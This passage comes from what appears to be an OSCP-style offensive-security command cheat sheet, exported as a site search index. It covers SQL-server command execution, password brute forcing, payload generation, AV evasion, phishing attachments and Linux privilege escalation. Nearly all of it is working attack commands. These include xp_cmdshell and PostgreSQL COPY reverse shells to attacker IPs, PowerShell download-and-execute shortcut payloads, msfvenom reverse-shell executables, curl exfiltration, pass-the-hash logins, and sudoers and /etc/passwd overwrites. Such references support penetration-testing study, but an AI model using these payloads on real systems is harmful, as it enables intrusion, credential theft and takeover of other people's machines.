SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\n\n-- For enabling xp_cmdshell with having privs\nEXECUTE sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXECUTE sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n-- for cmd exec\nEXECUTE xp_cmdshell 'whoami';\n-- During sql exploitation combine all of these command in stack SQL query\nEXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.119.3/psh_scripts/powercat.ps1\");powercat -c 192.168.119.3 -p 4444 -e powershell ';\n\n\n-- POSTGRESQL\nstring_agg(table_name,',') -- group_concat alternative\nSELECT usename, passwd FROM pg_shadow\n-- for cmd exec, use ; semicolon to end the previous statement because COPY command runs as a seperate SQL comand in stacked SQL query\nCOPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\n\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f';\n\npsql&gt; \\l  -- to list the database \npsql&gt; \\c database -- to connect to database like 'use database' in mariadb/mysql \npsql&gt; \\dt  -- list available tables in the connected dtabase\npsql&gt; \\dn  -- list all schemes of currently connected database\npsql&gt; \\? --help\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#bruteforcing","title":"\ud83d\udd22Bruteforcing","text":"<ul> <li>Go slow to avoid lockouts (respect domain policy)</li> <li>Spray one password across all usernames</li> <li>Try <code>username:username</code> as creds</li> <li>Try  <code>password</code> password</li> <li>try to use <code>admin:admin</code></li> <li>Empty Password too</li> <li>Collect credentials from every place and bruteforce and spray it</li> <li>Use <code>cewl</code> or similar to generate wordlists from websites</li> <li>Collect creds from:<ul> <li>SMB/FTP shares, web apps, exposed files, Git leaks <pre><code># In case of unstable network, adjust the the mtu by decreasing till you are good to go\nsudo ifconfig tun0 mtu 1250\nping -M do -s 1300 &lt;vpn-ip&gt;   # -M do = don't fragment\n# If it fails, your MTU is too high. Keep lowering the -s size until ping works.\n\n# HYDRA\nhydra -h \nhydra http-port-form -U\nhydra -l admin -P wordslist.txt 192.168.104.52 http-post-form \"/login.php:username=^USER^&amp;password=^PASS^&amp;debug=0:H=Content-Type: application/x-www-form-urlencoded:Failed\"\nhydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201\nhydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip\n# Hydra doesn't support smbv2 or v3 by default\n# -I = ignore restore file \n# -V = verbose\n# for base64 encoding \n\":username=^USER64^&amp;password=^PASS64^:C=/:F=403\"\n\n\n# medusa and ncrack are better alternative to hydra\nls /usr/lib/x86_64-linux-gnu/medusa/modules/\nmedusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/passwords.txt -M smbnt -t 10 &gt; medusa_results.txt\ngrep 'ACCOUNT_FOUND' medusa_results.txt\n\n\n# rdp can be bruteforce using hydra or through smb bruteforcing using netexec\nnetexec smb &lt;target-ip&gt; -u &lt;username&gt; -p wordlist.txt -d corp.co --continue-on-success\n# we can also use nxc to check which user is allowed to rdp in which machine using screenshot\nnetexec rdp &lt;ip-range&gt; -u user -p pass -d corp.com --continue-on-success --screenshot --screentime &lt;time&gt; # --nla-screenshot\n\nkerbrute passwordspray -d corp.com adusers.txt 'Nexus123!' --dc 192.168.237.70\n\n\n# FFUF\nffuf -w wordslist.txt  -X POST -d 'username=admin&amp;password=FUZZ' -u http://192.168.104.52/login.php -fr \"Failed\" -H \"Content-Type: application/x-www-form-urlencoded\"\n\n\n## GOBUSTER\n# -f to append trailing slash, sometimes /api results in error /api/ reveals data\ngobuster dir -u -r http://10.10.10.10:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt,asp,aspx,html,pdf,doc,bak,zip -p pattern | tee dir.enum\n\nzip,tar,tar.gz,txt,php\n# Try to add {GOBUSTER}/ pattern because sometimes ip/cgi-bin results 404 and ip/cgi-bin/ results in 403\n# pattern file can consists entries like {GOBUSTER}/v1\n\nferoxbuster --url http://192.168.175.46/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html\n\n\ngobuster vhost -u \"http://10.10.148.4\" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 \n\n\n## JOHN\nls /usr/bin/*2john /usr/sbin/*2john\njohn --list=formats | grep -i \njohn --format=nt --wordlist=rockyou.txt hash # mentioning format is important, somtimes it can throw an error during cracking\njohn --wordlist=ssh.passwords --rules=sshRules ssh.hash\n# for external rule file using --config parameter otherwise by default /etc/john/john.conf\njohn --wordlist=rockyou.txt --rules=MyRules --config=custom.conf --format=&lt;hash-format&gt; &lt;hashfile&gt;\n\n\n## HASHCAT\nhashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force\nhashcat -m 0 hash.txt /usr/share/wordilsts/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule\n\n\n## CRACKMAPEXEC\ncrackmapexec mssql 192.168.227.18 -u Administrator -p test_wordlist.txt --local-auth\n\n\n# Kerberos user enumeration\nnmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=klay.thm,userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt klaycomputer.klay.thm\nkerbrute userenum --dc 10.10.58.86 -d klay.thm /usr/share/seclists/Usernames/Names/names.txt\n\n# SMB bruteforcing\n\n\n## BURPSUITE Options\n## for csrf enabled brute forcing\nProject options -&gt; sessions -&gt; add new rule -&gt; add macro \nget csrf token from login page then configure item and custom parameter location and add parameter name.\nenable tolerate url mismatch and set scope to intruder and repeater\nfor proper csrf_token retrievel set to max concurrent = 1\n</code></pre></li> </ul> </li> </ul>"},{"location":"10_Commands_Quick_Reference/#wordlist","title":"Wordlist","text":"<pre><code>printf \"%s\\n\" 192.168.237.{70..76} &gt; wordlist.txt\n\n\n# Wordlist\nwhile IFS= read -r url; do\n    cewl -d 2 \"$url\" &gt;&gt; wordlist.txt  # also use --lowercase option,\ndone &lt; urls.txt\n\ncrunch 6 6 -t knownpass%%% &gt; wordlist   # % for digits  , for Uppercase  @ lowercase ^ symbols\ncrunch 4 6 abcd123 -o wordlist.txt # pass of 4 to 6 characters using charset\n\n# wordlist mutation\nhashcat -r demo.rule --stdout demo.txt  # [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)\n# /usr/share/hashcat/rules : more rules provided by hashcat\n\n# to use hashcat rules inside john add rule name \n# [List.Rules:sshRules] inside /etc/john/john.conf\njohn --wordlist=test.txt --rules --stdout\n\n# to transfer rules from hashcat to john\n (echo '[List.Rules:best64]' &amp;&amp; cat /usr/share/hashcat/rules/best64.rule ) &gt;&gt; custom64.conf\n\ncupp -i\n\ncreds search &lt;appname&gt; # for default creds\n\n# username generator\nnano names.txt # add full names\nawk '{print $2, $1}' names.txt &gt;&gt; names.txt\nusername_generator.py -w names.txt -u | sort -u &gt; usernames.txt\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#some-important-mutation-rules","title":"Some Important Mutation rules","text":"<ul> <li>/usr/share/hashcat/rules/rockyou-30000.rule</li> <li>/usr/share/hashcat/rules/best64.rule</li> </ul>"},{"location":"10_Commands_Quick_Reference/#some-important-wordlists","title":"Some important wordlists","text":"<p>Use cewl tool to crawl website specific login creds. - /usr/share/wordlists/dirb/common.txt  - /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt - /usr/share/dirb/wordlists/small.txt - /usr/share/wordlists/dirb/others/names.txt - /usr/share/seclists/Discovery/Web-Content/directory-list-* - /usr/share/wordlists/fasttrack.txt - /usr/share/metasploit-framework/data/wordlists/</p> <pre><code># [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)\n\n: # no rule apply\n$1 c $!    # hashcat rule content, ends with 1! and capitalize 1st character Most common one\n$! c $1\n$1 $2 $3 c $!\n$1 $2 $3 c $@\n$1 $2 $3 c $#\n$1 $2 $3 c $!\n\n# Also check other users password in order to get an idea of rules\nstrings -n 7  # to filter out minimum length password from wordlits\n# using the rule fiel\nhashcat -r demo.rule --stdout demo.txt\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#exploitation","title":"\ud83d\udca5Exploitation","text":""},{"location":"10_Commands_Quick_Reference/#payload-creation","title":"Payload Creation","text":"<p>Check All The Payload Code: [[Code &amp; Exploit Cheatsheet#Victim Machine Payloads]] <pre><code># cross compilation\nx86_64-w64-mingw32-gcc windows_service.c -o service.exe  # for 64 bit\ni686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe \u00a0-lws2_32  # for 32 bit\ngcc -static -m32 code.c -o test  # for 32 bit linux\ngcc -static code.c -o test  # for cross-compilation \n\n\n# MSF Venom\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; mal_reverse.exe\nmsfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe-service &gt; mal_service.exe\n\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c -e \"x86/shikata_ga_nai\" -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\"\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#evasion","title":"Evasion","text":"<pre><code># to encode and obfuscate powershell scripts in order to bypass AV\npowershell-encoder.py\npwsh&gt; InvokeStealth.ps1\n\nshellter # for stealth mode it needs meterpreter shell otherwise it will crash\n# Binaries to hide shell within Putty.exe, Spotify installer, sysmon.exe\n\nveil # generating evasive metasploit payload\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#file-transfer-delivery","title":"\ud83d\ude9aFile Transfer (Delivery)","text":"<p>More file transfer techniques</p> <pre><code># Python web server\npython -m http.server\n\n# ftp server\npython3 -m pyftpdlib -w -p 21 -u ignite -P 123 # skip -u -P for anonymous login\n\n# Smb share\nimpacket-smbserver sharename /tmp/smbshare -smb2support -username 'test' -password 'test'# for no auth -username '' -password '' also set chmod 777 temp  \nnet user \\\\ip\\sharename /user:test test  # on windows side\n\n# webdav\nwsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n\nupdog -p 8090\n\n# my tool\nfuzzy-httpserver -d /opt/transfers/ -p 800\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#initial-access","title":"\ud83d\udeaaInitial Access","text":"<pre><code>smbclient //192.168.50.212/secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b\n# --option='client min protocol=core' core/NT1/SMB2  to downgrade smb version client to check compatibility\n# Certain enumeration features work only in SMB1\n\nnetexec smb &lt;ip-range&gt; -u user.txt -p pass.txt --continue-on-success\nnetexec winrm &lt;ip-range&gt; -u user.txt -p pass.txt --continue-on-success\nnetexec rdp &lt;ip-range&gt; -u user.txt -p pass.txt -d corp.com --continue-on-success --screenshot --screentime &lt;time&gt; # --nla-screenshot\n# no bruteforce for pass spraying\n--no-bruteforce --continue-on-success\n\n\n# format of hashes \"LMHash:NTHash\" if LMhash isn't available then 32 0's\n# with admin right, gives SYSTEM account access due to service running under system account\n# Process: login to writable SMB share and upload the binary, Creates service to run that binary through RPC in order to get interactive shell \nimpacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Domain.com/Administrator@192.168.50.21 \nimpacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21   # Tested, it works\n# wmiexec.py leverages WMI over DCOM to execute commands, avoiding the need to create a new service on the target system.\n# Means more stealthier than psexec\nimpacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21\n\nnetexec smb 192.168.50.21 -u Administrator -H 7a38310ea6f0027ee955abed1762964b\nnetexec smb 192.168.50.21 -u 'WORKGROUP\\Administrator' -H 7a38310ea6f0027ee955abed1762964b\n# for NTLM relay attack\nimpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"\n\n# RDP using\nremmina    \nxfreerdp3 /u:'CORP\\Administrator' /p:'password' /v:192.168.50.246 /dynamic-resolution +clipboard\nxfreerdp3 /u:stephanie /d:corp.com /v:192.168.50.75  /dynamic-resolution +clipboard\nxfreerdp3 /u:'CORP\\Administrator' /pth:'ntlmhash' /v:192.168.50.246 /dynamic-resolution +clipboard\n\n# Reverse Shell\nnc -nlvp 4444\n# try well known ports like 80\nnc -nlvp 80 # in case something might be blocked\npenelope port # for more stable shell but if it doesn't work then use netcat\nsocat -d -d TCP-LISTEN:4444 STDOUT\n\n# Very stable in non-interactive environment\nbusybox nc &lt;ip&gt; &lt;port&gt; -e /bin/sh\n\n\nssh user@192.168.0.10 \"bash --noprofile --norc\"\nssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP\n\nevil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'\n\npowercat -c 192.168.119.3 -p 4444 -e powershell\nrunas /user:backupadmin cmd\n\n\nRunasCs.exe user1 password1 \"cmd /c whoami /all\"\n\n. .\\Inoke-RunasCS\nInvoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\"\n\n# ALSO CHECK [[#Lateral Movement in AD]]\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#extras","title":"Extras","text":"<pre><code>webshells\n\nvillain # for shell management\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#attacker-from-windows","title":"Attacker From Windows","text":"<pre><code># DNS Enumeration\nnslookup -type=TXT example.com 8.8.8.8\n# bruteforce subdomain\nGet-Content subdomains.txt | ForEach-Object { $sd=\"$_.example.com\"; if ((nslookup $sd 2&gt;$null) -match \"Name:\\s+$sd\") { Write-Host \"[+] $sd\" } }\n\n# Port Scanning\nTest-NetConnection -Port 445 192.168.50.151\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"192.168.50.151\", $_)) \"TCP port $_ is open\"} 2&gt;$null\n\n# SMB Enumeration\nnet view \\\\dc01 /all # where dc01 is the hostname\nnet use \\\\machine_name \n\n# Tools delivery\ndism /online /Enable-Feature /FeatureName:TelnetClient # to install microsoft version of telnet but requires administrative privs\n# we can transfer windows binary from our machine\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#web-attack","title":"\ud83d\udd78 Web Attack","text":"<pre><code># Exploitation\n# sometimes browser can't show some file so use curl e.g. just an example\ncurl --path-as-is http://ip:port/../../../../../test.txt\n\n\n# Blind SQLI - Boolean Based\n# Payload: admin' AND BINARY SUBSTRING((SELECT password FROM users WHERE username = 'admin'),FUZZ_INDEX,1) = 'FUZZ_CHAR';#---\nffuf -c --request-proto http -request login.req -w &lt;(seq 32):FUZZ_INDEX -w &lt;(python -c 'import string; print(\"\\n\".join([x for x in string.ascii_letters + string.digits]))'):FUZZ_CHAR -fr 'Invalid password!' -o ffuf.json\n\n# Blind SQLI - Time Based\n# Payload: admin' AND IF (SUBSTRING(@@version, FUZZ_INDEX, 1) = FUZZ_CHAR, sleep(3),'false');#---\nffuf -c --request-proto http -request search.req -w &lt;(seq 6):FUZZ_INDEX -w &lt;(python -c 'import string; print(\"\\n\".join([x for x in string.digits]))'):FUZZ_CHAR -enc FUZZ_CHAR:urlencode    -o ffuf.json\n\npayload=\"select%20group_concat(%20distinct%20table_name,':')%20from%20information_schema.columns\" # we can use that var in below urldecoded: \"select group_concat( distinct table_schema,':') from information_schema.columns\" \nffuf -u \"http://192.168.227.16/blindsqli.php?user=offsec'%20and%20if(SUBSTRING((select%20database()),FUZZ_INDEX,1)='FUZZ_CHAR',sleep(3),false)%20--%20-\" -w &lt;(seq 32):FUZZ_INDEX -w &lt;(python -c 'import string; print(\"\\n\".join([x for x in string.ascii_letters + string.digits+\",:\"]))'):FUZZ_CHAR -mt '&gt;5000' -o test_ffuf.json\n# sort -un and uniq can be used in case of repetitive characters\n\n# for checking the result of this json file\ncat ffuf.json | jq '.results[].input | .FUZZ_INDEX+\" \"+.FUZZ_CHAR' -r | sort -n | awk '{print $2}' | tr -d '\\n'\n# for more indepth: [Manual Exploit Blind SQLi](https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345)\n\n\n# phpinfo.php\n# Loaded environment variables to find leaked API keys\n# version of exploit finding\n# DOCUMENT_ROOT &amp; include_path for LFI\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#client-side-attack","title":"\ud83e\uddd1 Client Side Attack","text":"<p>evil_macro.py malicious-pdf.py MMG-LO</p> <pre><code># create a malicious HTA with msfvenom\nmsfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f hta-psh -o file.hta\n\n# generate a malicious macro for a reverse shell in powershell using base64 for .doc\npython evil_macro.py -l &lt;ip&gt; -p &lt;port&gt; -o macro.txt\n\n# generate a malicious PDF file\npython3 malicious-pdf.py burp-collaborator-url\n\n# generate a malicious odt file\npython mmg-odt.py windows &lt;ip&gt; &lt;port&gt;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#microsoft-windows-library-file","title":"Microsoft Windows Library File","text":"<p>Library File Schema Filename: config.Library-ms <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://192.168.45.237&lt;/url&gt; &lt;!-- webdav ip --&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre></p> <p>Host a malicious windowss shortcut file in that webdav directory that will gonna give us back the reverse shell. <pre><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre> Shortcut file content <pre><code>powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.45.175 -p 4444 -e powershell\"\n</code></pre></p> <p>Upload malicious pdf, docx, odt, Library-ms file to SMB or send to email. <pre><code>sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.227.199 --body @body.txt --header \"Subject: Problems\" --suppress-data\n\n# or use\nevolution\n</code></pre></p> <p>For More, Check Out: [[Code &amp; Exploit Cheatsheet]]</p>"},{"location":"10_Commands_Quick_Reference/#victim-linux-commands","title":"\ud83d\udc27 Victim Linux Commands","text":""},{"location":"10_Commands_Quick_Reference/#for-more","title":"For more","text":"<ul> <li>linux privesc basic</li> <li>PayloadAllthethings LinuxPrives</li> </ul>"},{"location":"10_Commands_Quick_Reference/#stabilizing-shell","title":"Stabilizing shell","text":"<pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nstty raw -echo &amp;&amp; fg\n\nexport TERM=xterm\nexport SHELL=bash\nstty rows &lt;num&gt; columns &lt;num&gt;\nstty size\n\n# whenever you run any exploit and getting no output then try getting back the connection on another listener\nc:\\xampp\\nc.exe 192.168.45.244 9999 -e powershell.exe\n\n# in case command not found occur in windows then\n\nset PATH=%PATH%C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#enumeration","title":"\ud83d\udd0dEnumeration","text":"<pre><code>sudo updatedb\nlocate &lt;file&gt; # to locate any file\n\nid\ncat /etc/passwd\nhostname  # gives hint of the purpose of the machine\nenv \n</code></pre>"},{"location":"10_Commands_Quick_Reference/#user-operating-system","title":"User &amp; Operating System","text":"<pre><code>cat /etc/issue\ncat /etc/*-release\ncat /proc/version\narch\nuname -r \nuname -a\nid\n# example: \u00a0Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture\nsearchsploit \"linux kernel Ubuntu 16 Local Privilege Escalation\"   | grep  \"4.\" | grep -v \" &lt; 4.4.0\" | grep -v \"4.8\"\nlinux-exploit-suggestor-2019.sh # works great whereas latest one missed some of them\n\nhostnamectl\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#network","title":"Network","text":"<pre><code>ifconfig / ip a\nroutel / route\nnetstat -ano  /  ss -anp\n/proc/net/tcp  # use github [proc_net_parser](https://github.com/nikn0laty/proc_net_parser) Tool\nresolvectl status # to check for dns settings\nnslookup -type=txt domain &lt;dnsserverip&gt;\n\n\n# Firewall rules \niptables # requires root perms instead we can read files\n/etc/iptables # use by sytem to restore netfilter rules at boot time\ncat /etc/iptables/rules.v4\n\n\n# network traffic but requires sudo for raw socket packet capture\nsudo tcpdump -i lo -A | grep \"pass\"\nsudo tcpdump -i &lt;interface&gt; -s 0 -w capture.pcap\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#cronjobs","title":"Cronjobs","text":"<pre><code>/etc/cron.*\ncrontab -l   # current user cron jobs\ncrontab -u user -l\nsudo crontab -l # gives root user cron jobs\n/var/log/cron.log  # logs of running cronjobs\ngrep \"CRON\" /var/log/syslog\n/var/spool/cron/crontabs/   # all crontabs in one place but sudo requires\n\nls /etc/cron*\n./pspy64\n\n# tar wildcard exploit\necho \"\" &gt; \"--checkpoint-action=exec=sh exploit.sh\" \necho \"\" &gt; '--checkpoint=1'\n\n# exploit can be revshell or\necho 'kali ALL=(root) NOPASSWD: ALL' &gt; /etc/sudoers\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#misconfigured-permissions","title":"Misconfigured Permissions","text":"<pre><code># FILES\nfind / -writable -type d 2&gt;/dev/null\n\n# SUID files\nfind / -perm -u=s -type f 2&gt;/dev/null   #  GTFObins\n# SUID or SGID\nfind / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2&gt; /dev/null\n\n# linux capabilities\n/usr/sbin/getcap -r / 2&gt;/dev/null  # cap_setuid+ep\n\n# [app armor](https://apparmor.net/) status \nsudo aa-status # sudo perms requires\n/etc/apparmor.d  # all the profiles gets listed here\n# to remove any binary profile from apparmor\nsudo apparmor_parser -R /etc/apparmor.d/usr.sbin.tcpdump  # for example, and then remove that file and reload using systemctl apparmor\n\n\n# sudo perms\nsudo -l\nsudo -u user cmd\nsudo -i  # to login as root\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#drives-devices-and-packages","title":"Drives, devices and packages","text":"<pre><code># drives\nmount\ncat /etc/fstab\nlsblk\ndf -h\n\n# device drivers or kernel modules\nlsmod\n/sbin/modinfo &lt;modulename_from_above_command&gt;\n\n#pkg mgmt\ndpkg -l\nrpm\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#processes-services","title":"Processes &amp; services","text":"<pre><code># processes\nps aux\n./pspy64\nwatch -n 1 \"ps -aux | grep pass\"  \nmount | grep proc     # NOT TESTED: look for hidepid=2 for hidden process then use pspy\n\n\n# running services\nsystemctl list-units --type=service --state=running\nservice --status-all\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#searching-commands","title":"Searching Commands","text":"<pre><code># Find Commands\nfind . -name flag1.txt\nfind / -mtime 10 # modified in the last 10 days\nfind / -atime 10  # accessed\nfind / -amin -60 # accessed min\nfind / -cmin -60 # changed mins\n-size +50M \nfind / -writable -type d # world writable dirs\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#imp-files","title":"\ud83d\uddc4 Imp Files","text":"<ul> <li>Linux Sensitive files <pre><code>env\n.bashrc\n.bash_history\n\n/etc/hosts \n/etc/resolv.conf\n/var/lib/apache2/\n/etc/apache2/sites-enabled/000-default.conf\n/etc/ssh/sshd_config\n/etc/init.d/knockd  # to find out the path of conf\n/etc/iptables/rules.v4\n/etc/freeswitch/autoload_configs/event_socket.conf.xml\n/etc/exports\n/etc/redis/redis.conf\n\n/var/lib/grafana/grafana.db\n\n/opt \n/mnt\n\n# Different ssh keys name\n/home/user/.ssh/id_rsa\nid_ecdsa\nid_ed25519\nid_dsa\nid_ecdsa_sk \nid_ed25519_sk\n\n\n/usr/share/tomcat9/etc/tomcat-users.xml\n\n/proc/cpuinfo\n/proc/devices\n/proc/meminfo\n/proc/net/tcp\n/proc/net/udp\n/proc/self/cmdline\n/proc/self/environ\n/proc/self/mounts\n/proc/self/stat\n/proc/self/status\n/proc/version\n</code></pre></li> </ul>"},{"location":"10_Commands_Quick_Reference/#file-transfer-download","title":"\ud83d\udcc2File Transfer (Download)","text":"<p>More file transfer techniques</p> <pre><code>wget http://ip:port -O /dir/file\nwget ip:port -O /dir/file\n\ncurl -O http://&lt;ip&gt;:&lt;port&gt;/&lt;file&gt;\n\n# in case of ssh\nscp -O -i priv_key kali_file user@IP:/victimpath # -O for backward compatibility\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#upload-exfiltration","title":"(Upload) - Exfiltration","text":"<pre><code>curl --data @file.txt http://&lt;ip&gt;:8000/mydump.txt\ncurl --data \"username=admin&amp;password=1234\" http://&lt;ip&gt;:8000/mydump.txt\nwget --method=POST --body-file=&lt;file_path&gt; http://ip:port/outfile\n# in case of ssh\nscp\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#privesc-vectors","title":"\u2b06 PrivEsc Vectors","text":"<pre><code># Check Linux PrivEsc Methodology: [[Methodology For OSCP#\ud83d\udee0\ufe0f Privilege Escalation Vectors#\ud83d\udc27 Linux]] \n\n# for automated priv esc vectors finding\nchmod +x linpeas.sh &amp;&amp; ./linpeas.sh | tee filename.txt \n\n# if /etc/passwd writable then\nmkpasswd -m sha-512 newpasswordhere  # same as below \nopenssl passwd w00t   # generate passwd file hash \necho 'root2:$1$jHnmMC8j$eIN3rfj8J9NaKYjKLwt9M/:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n\n\nsu\n# if /etc/shadow readable\nunshadow passwd.txt shadow.txt &gt; passwords.txt # now crack it\n\n# SUDO LD_PRELOAD\nsudo LD_PRELOAD=/home/user/ldpreload/shell.so find\n\n\n# SUID binary gtfobins\n\n# [linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)\n\n\n# sudoers file perms\necho 'kali ALL=(root) NOPASSWD: ALL' &gt; /etc/sudoers\necho 'kali ALL=(ALL) NOPASSWD: ALL' &gt; /etc/sudoers\n\n# SUID Binaries\n# shared object injection within SUID and SGID binary\nstrace /usr/local/bin/suid-binary 2&gt;&amp;1 | grep -iE \"open|access|no such file\"\ngcc -shared -fPIC -o /home/user/.config/libcalc.so\u00a0/home/user/tools/suid/libcalc.c  # add the malicious so in place of missing\n\n\n# ABUSING SHELL FEATURES\n# In Bash versions\u00a0&lt;4.2-048, export functions to run instead of original executables\nfunction /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n\n# PATH Hijacking\n# If a program (e.g. an SUID binary) invokes tools like `cat`, `ls`, or `ps` without full paths,\n# you can place your malicious binary earlier in $PATH or manipulate $PATH variable and gain code execution under escalated privileges.\n\n# Example: hijacking an SUID wrapper that runs `cat`\nmkdir /tmp/attack &amp;&amp; cd /tmp/attack\necho 'exec /bin/sh' &gt; cat\nchmod +x cat\nexport PATH=\"/tmp/attack:$PATH\"\n# Now when the SUID binary runs `cat`, it executes your shell as root\n\n# \u2013 Relative or unsanitized path usage in SUID/root scripts: placing tools in CWD or early in $PATH can hijack exec calls :contentReference[oaicite:0]{index=0}\n\n# \u2013 Cron jobs or services invoking commands by name: if they use PATH and run as root, dropping malicious versions in a writable dir in PATH can hijack them :contentReference[oaicite:1]{index=1}\n\n# \u2013 LD_PRELOAD hijacking: placing evil shared libs in LD_LIBRARY_PATH when root-set-exec runs dynamic binaries\n\n# \u2013 Library hijacking: placing .so in writable library dirs or . relative CWD before system libs\n\n\n# NFS Share, if root squashing is disabled\n# Files created via NFS inherit the\u00a0remote\u00a0user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the \"nobody\" user.\ncat /etc/exports\n\n# on our kali machine\nshowmount -e target_ip\nmkdir /tmp/nfs  \nmount -o rw,vers=3 &lt;target_ip&gt;:/target_share /tmp/nfs\n\n\n# lxd/lxc and docker group priv esc\n#\n# [lxc/lxd Exploit](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation?q=#method-2)\n# [Docker group and more interesting groups](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group)\n# More\n# [priv esc using docker/lxd](https://materials.rangeforce.com/tutorial/2019/12/07/Privilege-Escalation-Docker-LXD-Groups/)\n\n\n# Service Escalation\nfind /etc -type f -writable 2&gt;/dev/null\n/etc/systemd/system/pythonapp.service\n\n\n# SSH authorized keys (Check using nmap what type of ssh-hostkey SSH server will gonna accept)\n# On the basis of ssh-hostkey change rsa,ecdsa and so on\nssh-keygen -t rsa -b 4096 -f my_backdoor -N \"\" # on kali\n# on victim\necho \"ssh-rsa 